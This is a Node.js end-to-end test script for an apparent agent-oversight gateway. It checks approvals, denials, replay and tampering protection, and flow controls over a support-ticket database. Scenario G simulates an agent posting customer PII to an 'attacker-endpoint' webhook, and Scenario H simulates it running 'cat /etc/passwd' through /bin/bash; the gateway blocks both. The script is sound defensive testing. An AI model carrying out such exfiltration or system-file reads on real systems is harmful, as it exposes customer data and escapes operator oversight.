require('dotenv').config();
const { PrismaClient } = require('@prisma/client');
const { ActionNormalizer } = require('../apps/api/dist/actions/ActionNormalizer');
const { DecisionEngine } = require('../apps/api/dist/trajectory/DecisionEngine');
const { ContractEvaluator } = require('../apps/api/dist/trajectory/evaluators/ContractEvaluator');
const { PolicyEvaluator } = require('../apps/api/dist/trajectory/evaluators/PolicyEvaluator');
const { SensitivityEvaluator } = require('../apps/api/dist/trajectory/evaluators/SensitivityEvaluator');
const { SequenceEvaluator } = require('../apps/api/dist/trajectory/evaluators/SequenceEvaluator');
const { CapabilityEvaluator } = require('../apps/api/dist/trajectory/evaluators/CapabilityEvaluator');
const { TrajectoryEvaluator } = require('../apps/api/dist/trajectory/evaluators/TrajectoryEvaluator');
const { ConnectorManager } = require('../packages/connectors/dist/ConnectorManager');
const { PostgreSqlConnector } = require('../packages/connectors/dist/PostgreSqlConnector');
const { HttpSimulator } = require('../packages/connectors/dist/HttpSimulator');
const { EventStore } = require('../apps/api/dist/events/EventStore');
const { InterventionManager } = require('../apps/api/dist/interventions/InterventionManager');
const { RuntimeGateway } = require('../apps/api/dist/runtime/RuntimeGateway');
const { validateApprovalBinding } = require('../packages/runtime-sdk/dist/index');

const prisma = new PrismaClient();

// ANSI color helpers
const green = (s) => `\x1b[32m${s}\x1b[0m`;
const red = (s) => `\x1b[31m${s}\x1b[0m`;
const yellow = (s) => `\x1b[33m${s}\x1b[0m`;
const cyan = (s) => `\x1b[36m${s}\x1b[0m`;
const bold = (s) => `\x1b[1m${s}\x1b[0m`;

let passedCount = 0;
let totalCount = 0;

function assert(condition, message) {
  totalCount++;
  if (!condition) {
    console.error(`  ${red('✖ FAIL:')} ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedCount++;
  console.log(`  ${green('✓ PASS:')} ${message}`);
}

async function runDeterministicReset() {
  console.log(`\n${cyan('--- Setup: Deterministic Database State Reset ---')}`);
  // Ensure workspace
  await prisma.workspace.upsert({
    where: { id: 'default-workspace' },
    update: { name: 'HEED Demo Workspace' },
    create: { id: 'default-workspace', name: 'HEED Demo Workspace' }
  });

  // Ensure agent
  await prisma.agent.upsert({
    where: { id: 'support-agent' },
    update: { name: 'support-agent', description: 'Autonomous Support Resolution Agent' },
    create: { id: 'support-agent', name: 'support-agent', description: 'Autonomous Support Resolution Agent', workspaceId: 'default-workspace' }
  });

  // Clean support tickets
  await prisma.supportTicket.deleteMany({});
  try {
    await prisma.$executeRawUnsafe(`ALTER SEQUENCE "SupportTicket_id_seq" RESTART WITH 1;`);
  } catch (e) {}

  await prisma.supportTicket.createMany({
    data: [
      { id: 1, title: 'Login Issue', description: 'Customer cannot log in via SSO.', priority: 'HIGH', status: 'OPEN', customerEmail: 'sarah@enterprise.com' },
      { id: 2, title: 'Billing Error', description: 'Charged twice for annual tier.', priority: 'CRITICAL', status: 'OPEN', customerEmail: 'finance@acme.com' },
      { id: 3, title: 'Feature Request', description: 'CSV audit export.', priority: 'LOW', status: 'RESOLVED', customerEmail: 'dev@startup.io', internalNotes: 'Done in v2.4' },
      { id: 4, title: 'Bug in dashboard', description: 'Analytics chart date picker bug.', priority: 'MEDIUM', status: 'IN_PROGRESS', customerEmail: 'mark@agency.net', internalNotes: 'Assigned to triage' }
    ]
  });

  // Clean prior executions
  const existingExecs = await prisma.execution.findMany({ where: { agentId: 'support-agent' }, select: { id: true } });
  if (existingExecs.length > 0) {
    const ids = existingExecs.map(e => e.id);
    await prisma.compensation.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.intervention.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.event.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.actionEvent.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.executionContract.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.executionPolicySnapshot.deleteMany({ where: { executionId: { in: ids } } }).catch(() => {});
    await prisma.execution.deleteMany({ where: { id: { in: ids } } }).catch(() => {});
  }

  const count = await prisma.supportTicket.count();
  assert(count === 4, `PostgreSQL seeded with exactly 4 realistic support tickets.`);
}

function buildRuntimeGateway(interventionResolver) {
  const normalizer = new ActionNormalizer();
  const trajectoryEngine = new DecisionEngine();
  trajectoryEngine.register(new ContractEvaluator());
  trajectoryEngine.register(new PolicyEvaluator());
  trajectoryEngine.register(new SensitivityEvaluator());
  trajectoryEngine.register(new SequenceEvaluator());
  trajectoryEngine.register(new CapabilityEvaluator());
  trajectoryEngine.register(new TrajectoryEvaluator());

  const connectorManager = new ConnectorManager();
  connectorManager.register(new PostgreSqlConnector(prisma));
  connectorManager.register(new HttpSimulator());

  const eventStore = new EventStore(prisma);
  const interventionManager = new InterventionManager(prisma);

  if (interventionResolver) {
    interventionManager.on('new_intervention', async (inv) => {
      // Allow async processing
      setTimeout(() => interventionResolver(interventionManager, inv), 10);
    });
  }

  const gateway = new RuntimeGateway({
    normalizer,
    trajectoryEngine,
    connectorManager,
    eventStore,
    interventionManager,
    prisma
  });

  return { gateway, interventionManager, connectorManager };
}

async function createExecution(executionId, objective, contractOptions = {}) {
  const execution = await prisma.execution.create({
    data: {
      id: executionId,
      agentId: 'support-agent',
      objective,
      status: 'RUNNING'
    }
  });

  await prisma.executionContract.create({
    data: {
      executionId,
      objective,
      allowedSystems: contractOptions.allowedSystems || ['postgres', 'postgresql', 'database', 'http'],
      allowedCapabilities: contractOptions.allowedCapabilities || ['database.read', 'database.write', 'external_network.write'],
      restrictedResources: contractOptions.restrictedResources || [],
      expectedActions: contractOptions.expectedActions || ['read_tickets', 'add_note', 'bulk_resolve', 'query'],
      forbiddenCapabilities: contractOptions.forbiddenCapabilities || ['os.execute', 'system.shell'],
      flowRules: contractOptions.flowRules || [
        {
          sourceLabels: ['PII', 'CUSTOMER_DATA'],
          destinationTypes: ['EXTERNAL_UNTRUSTED_WEBHOOK'],
          decision: 'BLOCK',
          reason: 'Information Flow Control: Customer PII cannot be exfiltrated to untrusted external webhooks.'
        }
      ]
    }
  });

  return execution;
}

async function main() {
  console.log(bold('\n========================================================================'));
  console.log(bold('  HEED RUNTIME AUTHORITY VERIFICATION SUITE (DEMO E2E CHECK)'));
  console.log(bold('  Core Thesis: The agent is autonomous, but its authority is not unlimited.'));
  console.log(bold('========================================================================'));

  await runDeterministicReset();

  // -------------------------------------------------------------------------
  // SCENARIO A: Safe Database Read
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario A: Safe Database Read (ALLOW -> Real PostgreSQL Query)')}`);
  {
    const execId = `demo-exec-a-${Date.now()}`;
    await createExecution(execId, 'Find all open high-priority support tickets and summarize them.');
    const { gateway } = buildRuntimeGateway();

    const readAction = {
      system: 'postgres',
      operation: 'read_tickets',
      resource: 'support_tickets',
      capability: 'database.read',
      arguments: { priority: ['HIGH', 'CRITICAL'], status: 'OPEN' }
    };

    console.log(`  [Agent] Requesting read_tickets for HIGH & CRITICAL open tickets...`);
    const result = await gateway.processActionRequest('default-workspace', execId, readAction);

    assert(result && result.count === 2, `HEED returned real tickets count = 2.`);
    assert(result.tickets.some(t => t.title === 'Login Issue'), `Returned ticket #1 "Login Issue" (HIGH priority).`);
    assert(result.tickets.some(t => t.title === 'Billing Error'), `Returned ticket #2 "Billing Error" (CRITICAL priority).`);

    // Verify audit event recorded in PostgreSQL
    const event = await prisma.actionEvent.findFirst({
      where: { executionId: execId, operation: 'read_tickets' }
    });
    assert(event && event.status === 'ALLOWED', `Audit trail confirms ActionEvent recorded as ALLOWED in PostgreSQL.`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO B: Safe Database Modification
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario B: Safe Database Modification (ALLOW -> Real PostgreSQL Mutation)')}`);
  {
    const execId = `demo-exec-b-${Date.now()}`;
    await createExecution(execId, 'Add an internal investigation note to ticket 1.');
    const { gateway } = buildRuntimeGateway();

    const noteText = 'Agent investigation note: OAuth session timeout validated in logs.';
    const updateAction = {
      system: 'postgres',
      operation: 'add_note',
      resource: 'support_tickets/1',
      capability: 'database.write',
      arguments: { ticketId: 1, note: noteText }
    };

    console.log(`  [Agent] Requesting add_note on ticket 1...`);
    const result = await gateway.processActionRequest('default-workspace', execId, updateAction);

    assert(result && result.success === true, `HEED evaluated action and allowed mutation.`);

    // Directly query PostgreSQL to verify real state change
    const ticketInDb = await prisma.supportTicket.findUnique({ where: { id: 1 } });
    assert(ticketInDb.internalNotes === noteText, `Real PostgreSQL query confirms ticket 1 internalNotes was updated.`);
    console.log(`  [PostgreSQL DB State] Ticket 1 notes = "${ticketInDb.internalNotes}"`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO C & D: High-Impact Action & Human Denial
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario C & D: High-Impact Action (ASK) & Operator DENIAL')}`);
  {
    const execId = `demo-exec-cd-${Date.now()}`;
    await createExecution(execId, 'Resolve every currently open support ticket.');

    const { gateway, interventionManager } = buildRuntimeGateway();

    const bulkAction = {
      system: 'postgres',
      operation: 'bulk_resolve',
      resource: 'support_tickets',
      capability: 'database.write',
      arguments: { status: 'RESOLVED' }
    };

    console.log(`  [Agent] Requesting bulk_resolve for ALL open tickets...`);
    const actionPromise = gateway.processActionRequest('default-workspace', execId, bulkAction);

    // Yield to let HEED evaluate and pause
    await new Promise(r => setTimeout(r, 60));

    // Verify execution paused in AWAITING_APPROVAL
    const execState = await prisma.execution.findUnique({ where: { id: execId } });
    assert(execState.status === 'AWAITING_APPROVAL', `HEED paused execution: status is AWAITING_APPROVAL.`);

    // CRITICAL ASSERTION: Assert open tickets are STILL OPEN in PostgreSQL BEFORE any approval
    const openTicketsBefore = await prisma.supportTicket.findMany({ where: { status: 'OPEN' } });
    assert(openTicketsBefore.length === 2, `CRITICAL: PostgreSQL has NOT been mutated yet! Still 2 tickets OPEN.`);
    console.log(`  [PostgreSQL Safety Check] Open tickets count = ${openTicketsBefore.length} (Login Issue, Billing Error)`);

    // Operator DENIES the bulk resolution
    const pending = interventionManager.getPendingInterventions();
    assert(pending.length >= 1, `Operator interface shows pending intervention (${pending[0]?.id}).`);
    console.log(`  [Operator] Operator interface: Selecting DENY for intervention ${pending[0].id}...`);

    await interventionManager.resolveIntervention(pending[0].id, 'BLOCK');

    let threwError = false;
    try {
      await actionPromise;
    } catch (err) {
      threwError = true;
      assert(err.message.includes('blocked by human intervention') || err.message.includes('Action blocked'),
        `Agent execution halted with error: "${err.message}"`);
    }
    assert(threwError, `Agent call threw error as expected after operator DENIAL.`);

    // CRITICAL POST-DENIAL ASSERTION: Directly query PostgreSQL to prove NO side effect occurred
    const openTicketsAfterDenial = await prisma.supportTicket.findMany({ where: { status: 'OPEN' } });
    assert(openTicketsAfterDenial.length === 2, `CRITICAL PROOF: Tickets REMAIN OPEN in PostgreSQL after DENIAL.`);
    console.log(`  [PostgreSQL Safety Check] Open tickets count = ${openTicketsAfterDenial.length}. No side effect occurred!`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO E: Human Approval (ALLOW_ONCE -> Execution Continues -> Real DB Updated)
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario E: Human Approval (ALLOW_ONCE -> Real PostgreSQL Mutation)')}`);
  {
    const execId = `demo-exec-e-${Date.now()}`;
    await createExecution(execId, 'Authorized bulk ticket cleanup with human signoff.');

    const { gateway, interventionManager } = buildRuntimeGateway();

    const bulkAction = {
      system: 'postgres',
      operation: 'bulk_resolve',
      resource: 'support_tickets',
      capability: 'database.write',
      arguments: { status: 'RESOLVED' }
    };

    console.log(`  [Agent] Requesting bulk_resolve again...`);
    const actionPromise = gateway.processActionRequest('default-workspace', execId, bulkAction);

    // Yield to let HEED pause
    await new Promise(r => setTimeout(r, 60));

    const pending = interventionManager.getPendingInterventions();
    assert(pending.length >= 1, `Intervention created for bulk resolve.`);
    console.log(`  [Operator] Operator interface: Approving intervention with ALLOW_ONCE...`);

    // Operator Approves
    await interventionManager.resolveIntervention(pending[0].id, 'ALLOW_ONCE');

    const result = await actionPromise;
    assert(result && result.success === true, `Execution resumed and completed successfully.`);
    console.log(`  [Connector Result] Resolved count = ${result.resolvedCount}`);

    // Directly query PostgreSQL to prove the mutations actually happened after approval
    const openTicketsAfterApproval = await prisma.supportTicket.findMany({ where: { status: 'OPEN' } });
    assert(openTicketsAfterApproval.length === 0, `CRITICAL PROOF: Open tickets count is now 0 in PostgreSQL.`);

    const resolvedTickets = await prisma.supportTicket.findMany({ where: { status: 'RESOLVED' } });
    assert(resolvedTickets.length >= 3, `Previously open tickets are now officially RESOLVED in PostgreSQL.`);
    console.log(`  [PostgreSQL State Verified] All previously open tickets are now RESOLVED.`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO F: Approval Tampering & Replay Prevention
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario F: Approval Tampering & Replay Prevention')}`);
  {
    // 1. Replay prevention: Consumed binding is rejected
    const consumedBinding = {
      id: 'app-binding-1',
      consumed: true,
      status: 'APPROVED',
      executionId: 'exec-1',
      system: 'postgres',
      operation: 'update_ticket',
      capability: 'database.write',
      resource: 'support_tickets/1',
      argumentsHash: 'hash-args-valid',
      policySnapshotId: 'snap-1'
    };
    const replayCheck = validateApprovalBinding(
      consumedBinding, 'exec-1', 'postgres', 'update_ticket', 'database.write', 'support_tickets/1',
      'hash-args-valid', 'hash-prov', 'hash-dest', 'snap-1'
    );
    assert(replayCheck.valid === false, `Replay attack rejected: Consumed approval cannot be re-used.`);

    // 2. Tampering with arguments: Mutated hash is rejected
    const freshBinding = {
      ...consumedBinding,
      consumed: false,
      argumentsHash: 'original-payload-hash'
    };
    const tamperedCheck = validateApprovalBinding(
      freshBinding, 'exec-1', 'postgres', 'update_ticket', 'database.write', 'support_tickets/1',
      'tampered-payload-hash', 'hash-prov', 'hash-dest', 'snap-1'
    );
    assert(tamperedCheck.valid === false, `Tampering attack rejected: Mutated arguments do not match approval cryptographic binding.`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO G: Trust Boundary & Information Flow Control (IFC)
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario G: Trust Boundary & IFC Exfiltration Prevention')}`);
  {
    const execId = `demo-exec-g-${Date.now()}`;
    await createExecution(execId, 'Triage tickets and report metrics.', {
      flowRules: [
        {
          sourceLabels: ['CUSTOMER_PII'],
          destinationTypes: ['EXTERNAL_UNTRUSTED_WEBHOOK'],
          decision: 'BLOCK',
          reason: 'IFC Violation: Customer PII cannot be exfiltrated to untrusted external webhooks.'
        }
      ]
    });
    const { gateway } = buildRuntimeGateway();

    // Agent attempts to send customer PII to unauthorized external webhook
    const exfiltrateAction = {
      system: 'http',
      operation: 'post',
      resource: 'https://webhook.site/attacker-endpoint',
      capability: 'external_network.write',
      destinationType: 'EXTERNAL_UNTRUSTED_WEBHOOK',
      provenanceLabels: ['CUSTOMER_PII'],
      arguments: {
        tickets: [{ email: 'sarah@enterprise.com', text: 'Credit card double-charge details' }]
      }
    };

    console.log(`  [Agent] Attempting to export customer PII to external untrusted webhook...`);
    let ifcBlocked = false;
    try {
      await gateway.processActionRequest('default-workspace', execId, exfiltrateAction);
    } catch (err) {
      ifcBlocked = true;
      assert(err.message.includes('IFC Violation') || err.message.includes('Action blocked'),
        `HEED IFC boundary blocked exfiltration: "${err.message}"`);
    }
    assert(ifcBlocked, `Information Flow Control strictly enforced at runtime.`);
  }

  // -------------------------------------------------------------------------
  // SCENARIO H: Direct Bypass Prevention & Fail-Closed Invariants
  // -------------------------------------------------------------------------
  console.log(`\n${cyan('Scenario H: Direct Bypass Prevention & Fail-Closed Invariants')}`);
  {
    const execId = `demo-exec-h-${Date.now()}`;
    await createExecution(execId, 'Normal support operations', {
      forbiddenCapabilities: ['os.execute', 'system.shell']
    });
    const { gateway } = buildRuntimeGateway();

    // Agent attempts to run shell command
    const bypassAction = {
      system: 'system',
      operation: 'execute',
      capability: 'os.execute',
      resource: '/bin/bash',
      arguments: { command: 'cat /etc/passwd' }
    };

    console.log(`  [Agent] Attempting unauthorized OS command bypass...`);
    let bypassBlocked = false;
    try {
      await gateway.processActionRequest('default-workspace', execId, bypassAction);
    } catch (err) {
      bypassBlocked = true;
      assert(err.message.includes('forbidden') || err.message.includes('Action blocked'),
        `Unauthorized system execution blocked: "${err.message}"`);
    }
    assert(bypassBlocked, `Direct execution bypass prevented.`);
  }

  // -------------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------------
  console.log(bold('\n========================================================================'));
  console.log(bold(`  VALIDATION SUMMARY: ${passedCount} / ${totalCount} ASSERTIONS PASSED`));
  console.log(bold('========================================================================'));
  console.log(`${green('✓ Scenario A:')} Safe Read -> Real PostgreSQL returned verified tickets`);
  console.log(`${green('✓ Scenario B:')} Safe Note -> Real PostgreSQL mutated ticket 1 notes`);
  console.log(`${green('✓ Scenario C:')} High-Impact Action -> Evaluated as ASK, PostgreSQL untouched prior to decision`);
  console.log(`${green('✓ Scenario D:')} Human DENY -> Execution terminated, PostgreSQL STILL untouched`);
  console.log(`${green('✓ Scenario E:')} Human APPROVE -> Execution completed, PostgreSQL mutated to RESOLVED`);
  console.log(`${green('✓ Scenario F:')} Tampering & Replay -> Cryptographic approval binding enforced`);
  console.log(`${green('✓ Scenario G:')} Trust Boundary -> PII export to untrusted webhook blocked by IFC`);
  console.log(`${green('✓ Scenario H:')} Direct Bypass -> Unauthorized capabilities strictly rejected`);
  console.log(bold('\nPROVEN THESIS: The agent is autonomous, but its authority is not unlimited.\n'));
}

main()
  .catch((err) => {
    console.error(`\n${red('FATAL ERROR DURING DEMO CHECK:')}`, err);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
